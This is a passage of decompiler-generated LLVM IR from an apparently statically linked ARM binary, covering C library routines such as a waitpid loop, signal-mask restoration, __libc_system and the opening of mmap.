  %v0_28f38 = load i32, i32* @r5, align 4
  %v3_28f38 = add i32 %v4_28f34, %v0_28f30
  %v4_28f38 = inttoptr i32 %v3_28f38 to i32*
  store i32 %v0_28f38, i32* %v4_28f38, align 4
  br label %dec_label_pc_28f3c

dec_label_pc_28f3c:                               ; preds = %.thread64, %bb91, %dec_label_pc_28f18
  store i32 27468, i32* %r5.global-to-local, align 4
  %v0_28f40 = load i32, i32* @r6, align 4
  %v2_28f40 = add i32 %v0_28f40, 27468
  store i32 %v2_28f40, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_28f44

dec_label_pc_28f44:                               ; preds = %dec_label_pc_28f74.dec_label_pc_28f44_crit_edge, %dec_label_pc_28f3c
  %v0_28f4c = phi i32 [ %v0_28f4c.pre, %dec_label_pc_28f74.dec_label_pc_28f44_crit_edge ], [ %v2_28f40, %dec_label_pc_28f3c ]
  %v1_28f44 = phi i32 [ %v1_28f44.pre, %dec_label_pc_28f74.dec_label_pc_28f44_crit_edge ], [ 27468, %dec_label_pc_28f3c ]
  %v0_28f44 = phi i32 [ %v0_28f44.pre, %dec_label_pc_28f74.dec_label_pc_28f44_crit_edge ], [ %v0_28f40, %dec_label_pc_28f3c ]
  %v2_28f44 = add i32 %v0_28f44, %v1_28f44
  %v3_28f44 = inttoptr i32 %v2_28f44 to i32*
  %v4_28f44 = load i32, i32* %v3_28f44, align 4
  store i32 %v4_28f44, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_28f4c, i32* @r2, align 4
  %v1_28f50109 = inttoptr i32 %v0_28f4c to i32*
  %v2_28f50110 = load i32, i32* %v1_28f50109, align 4
  store i32 %v2_28f50110, i32* %r3.global-to-local, align 4
  %v3_28f54112 = icmp uge i32 %v2_28f50110, %v4_28f44
  store i1 %v3_28f54112, i1* %cpsr_c.global-to-local, align 1
  %v9_28f54118 = icmp eq i32 %v2_28f50110, %v4_28f44
  br i1 %v9_28f54118, label %dec_label_pc_28f5c, label %dec_label_pc_28f74

dec_label_pc_28f5c:                               ; preds = %dec_label_pc_28f44, %dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28f6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28f6c, label %dec_label_pc_28f70, label %dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge

dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge:  ; preds = %dec_label_pc_28f5c
  %v0_28f50.pre = load i32, i32* @r2, align 4
  %v1_28f54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28f50 = inttoptr i32 %v0_28f50.pre to i32*
  %v2_28f50 = load i32, i32* %v1_28f50, align 4
  store i32 %v2_28f50, i32* %r3.global-to-local, align 4
  %v3_28f54 = icmp uge i32 %v2_28f50, %v1_28f54.pre
  store i1 %v3_28f54, i1* %cpsr_c.global-to-local, align 1
  %v9_28f54 = icmp eq i32 %v2_28f50, %v1_28f54.pre
  br i1 %v9_28f54, label %dec_label_pc_28f5c, label %dec_label_pc_28f74

dec_label_pc_28f70:                               ; preds = %dec_label_pc_28f5c
  %v0_28f70 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28f70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28f74

dec_label_pc_28f74:                               ; preds = %dec_label_pc_28f44, %dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge, %dec_label_pc_28f70
  %v0_28f7c = phi i32 [ %v0_28f70, %dec_label_pc_28f70 ], [ %v2_28f50110, %dec_label_pc_28f44 ], [ %v2_28f50, %dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge ]
  %v1_28f74 = phi i32 [ %v0_28f70, %dec_label_pc_28f70 ], [ %v4_28f44, %dec_label_pc_28f44 ], [ %v1_28f54.pre, %dec_label_pc_28f5c.dec_label_pc_28f50_crit_edge ]
  %v3_28f74 = icmp uge i32 %v0_28f7c, %v1_28f74
  store i1 %v3_28f74, i1* %cpsr_c.global-to-local, align 1
  %v9_28f74 = icmp eq i32 %v0_28f7c, %v1_28f74
  br i1 %v9_28f74, label %dec_label_pc_28f7c, label %dec_label_pc_28f74.dec_label_pc_28f44_crit_edge

dec_label_pc_28f74.dec_label_pc_28f44_crit_edge:  ; preds = %dec_label_pc_28f74
  %v0_28f44.pre = load i32, i32* @r6, align 4
  %v1_28f44.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_28f4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_28f44

dec_label_pc_28f7c:                               ; preds = %dec_label_pc_28f74
  %v2_28f7c = icmp ne i32 %v1_28f74, 0
  store i1 %v2_28f7c, i1* %cpsr_c.global-to-local, align 1
  %v7_28f80 = icmp slt i32 %v1_28f74, 2
  br i1 %v7_28f80, label %dec_label_pc_2922c, label %dec_label_pc_28f84

dec_label_pc_28f84:                               ; preds = %dec_label_pc_28f7c
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2922c

dec_label_pc_28fa4:                               ; preds = %dec_label_pc_28e7c
  store i32 124, i32* %r3.global-to-local, align 4
  %v0_28fa8 = load i32, i32* @r6, align 4
  %v2_28fa8 = add i32 %v0_28fa8, 124
  %v3_28fa8 = inttoptr i32 %v2_28fa8 to i32*
  %v4_28fa8 = load i32, i32* %v3_28fa8, align 4
  store i32 -105716, i32* %r3.global-to-local, align 4
  store i32 %v4_28fa8, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28fb0 = icmp eq i32 %v4_28fa8, 0
  br i1 %v2_28fb0, label %.thread, label %bb92

.thread:                                          ; preds = %dec_label_pc_28fa4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28fbc65 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_28fbc65, i32* %r2.global-to-local, align 4
  %v3_28fc0 = add i32 %v0_28fa8, -105716
  store i32 %v3_28fc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_290b0

bb92:                                             ; preds = %dec_label_pc_28fa4
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28fbc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_28fbc, i32* %r2.global-to-local, align 4
  %v3_28fcc7 = add i32 %v0_28fa8, -105716
  store i32 %v3_28fcc7, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_290b0

dec_label_pc_290b0:                               ; preds = %bb92, %.thread
  %v0_28fb866 = phi i1 [ false, %.thread ], [ true, %bb92 ]
  call void @__pseudo_cond_branch(i1 %v0_28fb866, i32 %v4_28fa8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 120, i32* @r7, align 4
  store i32 1048593, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1048593, i32* %stack_var_-40, align 4
  store i32 104532, i32* @r5, align 4
  %v2_290b4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_290b4, i32* @r4, align 4
  br label %dec_label_pc_290b8

dec_label_pc_290b8:                               ; preds = %dec_label_pc_290d4.dec_label_pc_290b8_crit_edge, %dec_label_pc_290b0
  %v3_290bc = phi i32 [ %v3_290bc.pre, %dec_label_pc_290d4.dec_label_pc_290b8_crit_edge ], [ 1048593, %dec_label_pc_290b0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v2_290b4, i32* %r1.global-to-local, align 4
  %v3_290c4 = call i32 @__libc_waitpid(i32 %v3_290bc, i32 %v2_290b4, i32 0)
  %v3_290c8 = icmp eq i32 %v3_290c4, -1
  store i1 %v3_290c8, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_290c4, i32* %r2.global-to-local, align 4
  br i1 %v3_290c8, label %dec_label_pc_290d4, label %dec_label_pc_290e8

dec_label_pc_290d4:                               ; preds = %dec_label_pc_290b8
  %v0_290d4 = call i32 @__aeabi_read_tp()
  %v3_290d8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_290d8 = sext i16 %v3_290d8 to i32
  store i32 %v4_290d8, i32* %r3.global-to-local, align 4
  %v2_290dc = add i32 %v4_290d8, %v0_290d4
  %v3_290dc = inttoptr i32 %v2_290dc to i32*
  %v4_290dc = load i32, i32* %v3_290dc, align 4
  store i32 %v4_290dc, i32* %r3.global-to-local, align 4
  %v2_290e0 = icmp ugt i32 %v4_290dc, 3
  store i1 %v2_290e0, i1* %cpsr_c.global-to-local, align 1
  %v7_290e0 = icmp eq i32 %v4_290dc, 4
  br i1 %v7_290e0, label %dec_label_pc_290d4.dec_label_pc_290b8_crit_edge, label %dec_label_pc_290d4.dec_label_pc_290e8_crit_edge

dec_label_pc_290d4.dec_label_pc_290e8_crit_edge:  ; preds = %dec_label_pc_290d4
  %v0_290ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_290e8

dec_label_pc_290d4.dec_label_pc_290b8_crit_edge:  ; preds = %dec_label_pc_290d4
  %v3_290bc.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_290b8

dec_label_pc_290e8:                               ; preds = %dec_label_pc_290b8, %dec_label_pc_290d4.dec_label_pc_290e8_crit_edge
  %v0_290ec = phi i32 [ %v0_290ec.pre, %dec_label_pc_290d4.dec_label_pc_290e8_crit_edge ], [ %v3_290c4, %dec_label_pc_290b8 ]
  %v3_290e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_290e8, i32* %r3.global-to-local, align 4
  %v3_290ec = icmp uge i32 %v0_290ec, %v3_290e8
  store i1 %v3_290ec, i1* %cpsr_c.global-to-local, align 1
  %v9_290ec = icmp eq i32 %v0_290ec, %v3_290e8
  br i1 %v9_290ec, label %dec_label_pc_290fc, label %dec_label_pc_290f4

dec_label_pc_290f4:                               ; preds = %dec_label_pc_290e8
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_290fc

dec_label_pc_290fc:                               ; preds = %dec_label_pc_290e8, %dec_label_pc_290f4
  %v0_290fc = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_290fc = icmp eq i32 %v0_290fc, 0
  br i1 %v2_290fc, label %dec_label_pc_290fc..thread16_crit_edge, label %bb93

dec_label_pc_290fc..thread16_crit_edge:           ; preds = %dec_label_pc_290fc
  br label %.thread16

bb93:                                             ; preds = %dec_label_pc_290fc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_2910c = load i32, i32* @r6, align 4
  %v3_2910c = add i32 %v1_2910c, 52
  %v4_2910c = inttoptr i32 %v3_2910c to i32*
  br label %.thread16

.thread16:                                        ; preds = %dec_label_pc_290fc..thread16_crit_edge, %bb93
  %v0_29114.in = phi i32* [ @ip, %dec_label_pc_290fc..thread16_crit_edge ], [ %v4_2910c, %bb93 ]
  %v0_29114 = load i32, i32* %v0_29114.in, align 4
  %v2_29114 = xor i1 %v2_290fc, true
  call void @__pseudo_cond_branch(i1 %v2_29114, i32 %v0_29114)
  store i32 27468, i32* %r3.global-to-local, align 4
  %v0_2911c = load i32, i32* @r6, align 4
  %v2_2911c = add i32 %v0_2911c, 27468
  store i32 %v2_2911c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_2911c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2912c141 = inttoptr i32 %v2_2911c to i32*
  %v2_2912c142 = load i32, i32* %v1_2912c141, align 4
  store i32 %v2_2912c142, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_29130144 = icmp eq i32 %v2_2912c142, 0
  br i1 %v9_29130144, label %dec_label_pc_29138, label %dec_label_pc_29150

dec_label_pc_29138:                               ; preds = %.thread16, %dec_label_pc_29138.dec_label_pc_2912c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_29148 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_29148, label %dec_label_pc_2914c, label %dec_label_pc_29138.dec_label_pc_2912c_crit_edge

dec_label_pc_29138.dec_label_pc_2912c_crit_edge:  ; preds = %dec_label_pc_29138
  %v0_2912c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_29130.pre = load i32, i32* @r4, align 4
  %v1_2912c = inttoptr i32 %v0_2912c.pre to i32*
  %v2_2912c = load i32, i32* %v1_2912c, align 4
  store i32 %v2_2912c, i32* %r3.global-to-local, align 4
  %v3_29130 = icmp uge i32 %v2_2912c, %v1_29130.pre
  store i1 %v3_29130, i1* %cpsr_c.global-to-local, align 1
  %v9_29130 = icmp eq i32 %v2_2912c, %v1_29130.pre
  br i1 %v9_29130, label %dec_label_pc_29138, label %dec_label_pc_29150

dec_label_pc_2914c:                               ; preds = %dec_label_pc_29138
  %v0_2914c = load i32, i32* @r4, align 4
  store i32 %v0_2914c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_29150

dec_label_pc_29150:                               ; preds = %.thread16, %dec_label_pc_29138.dec_label_pc_2912c_crit_edge, %dec_label_pc_2914c
  %v0_29150 = phi i32 [ %v0_2914c, %dec_label_pc_2914c ], [ %v2_2912c142, %.thread16 ], [ %v2_2912c, %dec_label_pc_29138.dec_label_pc_2912c_crit_edge ]
  %v1_29150 = phi i32 [ %v0_2914c, %dec_label_pc_2914c ], [ 0, %.thread16 ], [ %v1_29130.pre, %dec_label_pc_29138.dec_label_pc_2912c_crit_edge ]
  %v3_29150 = icmp uge i32 %v0_29150, %v1_29150
  store i1 %v3_29150, i1* %cpsr_c.global-to-local, align 1
  %v9_29150 = icmp eq i32 %v0_29150, %v1_29150
  br i1 %v9_29150, label %bb95, label %bb94

bb94:                                             ; preds = %dec_label_pc_29150
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_29150, %bb94
  store i32 168284, i32* @lr, align 4
  %v1_29158 = xor i1 %v9_29150, true
  call void @__pseudo_cond_branch(i1 %v1_29158, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  store i32 27464, i32* %r2.global-to-local, align 4
  %v0_29160 = load i32, i32* @r6, align 4
  %v2_29160 = add i32 %v0_29160, 27464
  %v3_29160 = inttoptr i32 %v2_29160 to i32*
  %v4_29160 = load i32, i32* %v3_29160, align 4
  store i32 %v4_29160, i32* %r3.global-to-local, align 4
  %v1_29164 = add i32 %v4_29160, -1
  store i32 %v1_29164, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_29168 = icmp eq i32 %v1_29164, 0
  store i32 %v1_29164, i32* %v3_29160, align 4
  br i1 %v2_29168, label %dec_label_pc_29174, label %dec_label_pc_291a8

dec_label_pc_29174:                               ; preds = %bb95
  %v0_29178 = load i32, i32* @r7, align 4
  store i32 %v0_29178, i32* %r2.global-to-local, align 4
  %v0_2917c = load i32, i32* @r6, align 4
  %v2_2917c = add i32 %v0_2917c, 27424
  store i32 %v2_2917c, i32* %r1.global-to-local, align 4
  %v3_29184 = call i32 @__libc_sigaction(i32 2, i32 %v2_2917c, i32 %v0_29178)
  store i32 %v3_29184, i32* @r5, align 4
  %v0_29190 = load i32, i32* @r7, align 4
  store i32 %v0_29190, i32* %r2.global-to-local, align 4
  %v0_29194 = load i32, i32* @r6, align 4
  %v2_29194 = add i32 %v0_29194, 27444
  store i32 %v2_29194, i32* %r1.global-to-local, align 4
  %v3_2919c = call i32 @__libc_sigaction(i32 3, i32 %v2_29194, i32 %v0_29190)
  %v1_291a0 = load i32, i32* @r5, align 4
  %v2_291a0 = or i32 %v1_291a0, %v3_2919c
  %v4_291a0 = icmp eq i32 %v2_291a0, 0
  br i1 %v4_291a0, label %dec_label_pc_291a8, label %dec_label_pc_291c0

dec_label_pc_291a8:                               ; preds = %dec_label_pc_29174, %bb95
  %v0_291a8 = load i32, i32* @r4, align 4
  store i32 %v0_291a8, i32* %r2.global-to-local, align 4
  store i32 %v2_28e8c, i32* %r1.global-to-local, align 4
  %v4_291b4 = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-48, i32 %v0_291a8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_291b8 = icmp eq i32 %v4_291b4, 0
  br i1 %v2_291b8, label %dec_label_pc_291c8, label %dec_label_pc_291c0

dec_label_pc_291c0:                               ; preds = %dec_label_pc_29174, %dec_label_pc_291a8
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_291c8

dec_label_pc_291c8:                               ; preds = %dec_label_pc_291a8, %dec_label_pc_291c0
  store i32 27468, i32* %r5.global-to-local, align 4
  %v0_291cc = load i32, i32* @r6, align 4
  %v2_291cc = add i32 %v0_291cc, 27468
  store i32 %v2_291cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_291d0

dec_label_pc_291d0:                               ; preds = %dec_label_pc_29200.dec_label_pc_291d0_crit_edge, %dec_label_pc_291c8
  %v0_291d8 = phi i32 [ %v0_291d8.pre, %dec_label_pc_29200.dec_label_pc_291d0_crit_edge ], [ %v2_291cc, %dec_label_pc_291c8 ]
  %v1_291d0 = phi i32 [ %v1_291d0.pre, %dec_label_pc_29200.dec_label_pc_291d0_crit_edge ], [ 27468, %dec_label_pc_291c8 ]
  %v0_291d0 = phi i32 [ %v0_291d0.pre, %dec_label_pc_29200.dec_label_pc_291d0_crit_edge ], [ %v0_291cc, %dec_label_pc_291c8 ]
  %v2_291d0 = add i32 %v0_291d0, %v1_291d0
  %v3_291d0 = inttoptr i32 %v2_291d0 to i32*
  %v4_291d0 = load i32, i32* %v3_291d0, align 4
  store i32 %v4_291d0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_291d8, i32* @r2, align 4
  %v1_291dc128 = inttoptr i32 %v0_291d8 to i32*
  %v2_291dc129 = load i32, i32* %v1_291dc128, align 4
  store i32 %v2_291dc129, i32* %r3.global-to-local, align 4
  %v3_291e0131 = icmp uge i32 %v2_291dc129, %v4_291d0
  store i1 %v3_291e0131, i1* %cpsr_c.global-to-local, align 1
  %v9_291e0137 = icmp eq i32 %v2_291dc129, %v4_291d0
  br i1 %v9_291e0137, label %dec_label_pc_291e8, label %dec_label_pc_29200

dec_label_pc_291e8:                               ; preds = %dec_label_pc_291d0, %dec_label_pc_291e8.dec_label_pc_291dc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_291f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_291f8, label %dec_label_pc_291fc, label %dec_label_pc_291e8.dec_label_pc_291dc_crit_edge

dec_label_pc_291e8.dec_label_pc_291dc_crit_edge:  ; preds = %dec_label_pc_291e8
  %v0_291dc.pre = load i32, i32* @r2, align 4
  %v1_291e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_291dc = inttoptr i32 %v0_291dc.pre to i32*
  %v2_291dc = load i32, i32* %v1_291dc, align 4
  store i32 %v2_291dc, i32* %r3.global-to-local, align 4
  %v3_291e0 = icmp uge i32 %v2_291dc, %v1_291e0.pre
  store i1 %v3_291e0, i1* %cpsr_c.global-to-local, align 1
  %v9_291e0 = icmp eq i32 %v2_291dc, %v1_291e0.pre
  br i1 %v9_291e0, label %dec_label_pc_291e8, label %dec_label_pc_29200

dec_label_pc_291fc:                               ; preds = %dec_label_pc_291e8
  %v0_291fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_291fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_29200

dec_label_pc_29200:                               ; preds = %dec_label_pc_291d0, %dec_label_pc_291e8.dec_label_pc_291dc_crit_edge, %dec_label_pc_291fc
  %v0_29208 = phi i32 [ %v0_291fc, %dec_label_pc_291fc ], [ %v2_291dc129, %dec_label_pc_291d0 ], [ %v2_291dc, %dec_label_pc_291e8.dec_label_pc_291dc_crit_edge ]
  %v1_29200 = phi i32 [ %v0_291fc, %dec_label_pc_291fc ], [ %v4_291d0, %dec_label_pc_291d0 ], [ %v1_291e0.pre, %dec_label_pc_291e8.dec_label_pc_291dc_crit_edge ]
  %v3_29200 = icmp uge i32 %v0_29208, %v1_29200
  store i1 %v3_29200, i1* %cpsr_c.global-to-local, align 1
  %v9_29200 = icmp eq i32 %v0_29208, %v1_29200
  br i1 %v9_29200, label %dec_label_pc_29208, label %dec_label_pc_29200.dec_label_pc_291d0_crit_edge

dec_label_pc_29200.dec_label_pc_291d0_crit_edge:  ; preds = %dec_label_pc_29200
  %v0_291d0.pre = load i32, i32* @r6, align 4
  %v1_291d0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_291d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_291d0

dec_label_pc_29208:                               ; preds = %dec_label_pc_29200
  %v2_29208 = icmp ne i32 %v1_29200, 0
  store i1 %v2_29208, i1* %cpsr_c.global-to-local, align 1
  %v7_2920c = icmp slt i32 %v1_29200, 2
  br i1 %v7_2920c, label %dec_label_pc_29228, label %dec_label_pc_29210

dec_label_pc_29210:                               ; preds = %dec_label_pc_29208
  %v0_29214 = load i32, i32* %r1.global-to-local, align 4
  %v1_29214 = add i32 %v0_29214, 129
  store i32 %v1_29214, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_29228

dec_label_pc_29228:                               ; preds = %dec_label_pc_29210, %dec_label_pc_29208
  %v3_29228 = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_2922c

dec_label_pc_2922c:                               ; preds = %dec_label_pc_28f7c, %dec_label_pc_28f84, %dec_label_pc_29228
  %storemerge = phi i32 [ %v3_29228, %dec_label_pc_29228 ], [ -1, %dec_label_pc_28f84 ], [ -1, %dec_label_pc_28f7c ]
  store i32 %v3_28d30, i32* @r4, align 4
  store i32 %v6_28d30, i32* @r5, align 4
  store i32 %v9_28d30, i32* @r6, align 4
  store i32 %v12_28d30, i32* @r7, align 4
  store i32 %v15_28d30, i32* @r8, align 4
  store i32 %v21_28d30, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_291fc, { 1, 0, 2 }
  uselistorder i32 %v1_291e0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2914c, { 1, 0, 2 }
  uselistorder i32 %v1_29130.pre, { 0, 2, 1 }
  uselistorder i32 %v2_290b4, { 1, 0, 2 }
  uselistorder i32 %v0_28fa8, { 1, 0, 2 }
  uselistorder i32 %v0_28f70, { 1, 0, 2 }
  uselistorder i32 %v1_28f54.pre, { 0, 2, 1 }
  uselistorder i32 %v0_28ecc, { 1, 0, 2 }
  uselistorder i32 %v1_28eb0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_28e50, { 1, 0, 2 }
  uselistorder i32 %v1_28e34.pre, { 0, 2, 1 }
  uselistorder i32 %v0_28d90, { 1, 0, 2 }
  uselistorder i32 %v1_28d74.pre, { 0, 2, 1 }
  uselistorder i32 %v2_28d38, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-100, { 1, 0, 2 }
  uselistorder i32* %stack_var_-88, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 46, 4, 5, 6, 8, 7, 47, 10, 9, 12, 11, 13, 14, 15, 16, 17, 18, 19, 21, 20, 44, 22, 23, 24, 25, 26, 27, 29, 28, 45, 30, 31, 32, 34, 33, 48, 35, 36, 37, 38, 39, 40, 42, 41, 49, 43 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 25, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 34, 35, 4, 5, 6, 7, 36, 37, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 30, 31, 18, 19, 20, 32, 33, 21, 22, 23, 24, 38, 39, 25, 26, 27, 28, 29, 40, 41 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 4, 3, 2, 0 }
  uselistorder i32 -105716, { 1, 0, 2 }
  uselistorder i32 27444, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 7, 6, 5, 4, 3, 2, 10, 9, 1, 0, 8 }
  uselistorder i32 27464, { 0, 3, 1, 4, 2, 5, 6, 7 }
  uselistorder i32 27468, { 1, 3, 8, 4, 9, 0, 6, 11, 2, 5, 10, 7, 12, 13, 14 }
  uselistorder label %dec_label_pc_2922c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_29200, { 2, 1, 0 }
  uselistorder label %dec_label_pc_291e8, { 1, 0 }
  uselistorder label %dec_label_pc_291c8, { 1, 0 }
  uselistorder label %dec_label_pc_291c0, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %dec_label_pc_29150, { 2, 1, 0 }
  uselistorder label %dec_label_pc_29138, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %dec_label_pc_290fc, { 1, 0 }
  uselistorder label %dec_label_pc_290e8, { 1, 0 }
  uselistorder label %dec_label_pc_28f74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28f5c, { 1, 0 }
  uselistorder label %dec_label_pc_28f3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28f18, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_28ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28eb8, { 1, 0 }
  uselistorder label %dec_label_pc_28e54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28e3c, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_28d94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28d7c, { 1, 0 }
}

define i32 @function_2923c(i32 %arg1) local_unnamed_addr {
dec_label_pc_2923c:
  %v0_2923c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2923c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2923c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2923c, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_2927c = load i32, i32* @r4, align 4
  %v6_2927c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_29284 = icmp eq i32 %arg1, 0
  br i1 %v2_29284, label %dec_label_pc_29294, label %dec_label_pc_292ac

dec_label_pc_29294:                               ; preds = %entry
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34176), i32* @r0, align 4
  %v0_2929c = call i32 @do_system()
  %v1_292a0 = sub i32 1, %v0_2929c
  %v2_292a0 = icmp ult i32 %v0_2929c, 2
  br i1 %v2_292a0, label %dec_label_pc_292e4, label %bb

bb:                                               ; preds = %dec_label_pc_29294
  br label %dec_label_pc_292e4

dec_label_pc_292ac:                               ; preds = %entry
  %v4_292b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_292b4 = icmp eq i32 %v4_292b0, 0
  br i1 %v2_292b4, label %dec_label_pc_292bc, label %dec_label_pc_292c8

dec_label_pc_292bc:                               ; preds = %dec_label_pc_292ac
  store i32 %v6_2927c, i32* @r5, align 4
  %v0_292c4 = call i32 @do_system()
  br label %dec_label_pc_292c8

dec_label_pc_292c8:                               ; preds = %dec_label_pc_292ac, %dec_label_pc_292bc
  %v0_292c8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_292c8, i32* @r4, align 4
  %v0_292d0 = load i32, i32* @r5, align 4
  store i32 %v0_292d0, i32* @r0, align 4
  %v0_292d4 = call i32 @do_system()
  store i32 %v0_292d4, i32* @r5, align 4
  %v0_292dc = load i32, i32* @r4, align 4
  %v1_292e0 = call i32 @__libc_disable_asynccancel(i32 %v0_292dc)
  %v0_292e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_292e4

dec_label_pc_292e4:                               ; preds = %bb, %dec_label_pc_29294, %dec_label_pc_292c8
  %v0_292e4 = phi i32 [ 0, %bb ], [ %v1_292a0, %dec_label_pc_29294 ], [ %v0_292e4.pre, %dec_label_pc_292c8 ]
  store i32 %v3_2927c, i32* @r4, align 4
  store i32 %v6_2927c, i32* @r5, align 4
  ret i32 %v0_292e4

; uselistorder directives
  uselistorder i32 %v0_2929c, { 1, 0 }
  uselistorder i32 %v6_2927c, { 1, 0 }
  uselistorder i32 ()* @do_system, { 1, 2, 0 }
  uselistorder label %dec_label_pc_292e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_292c8, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
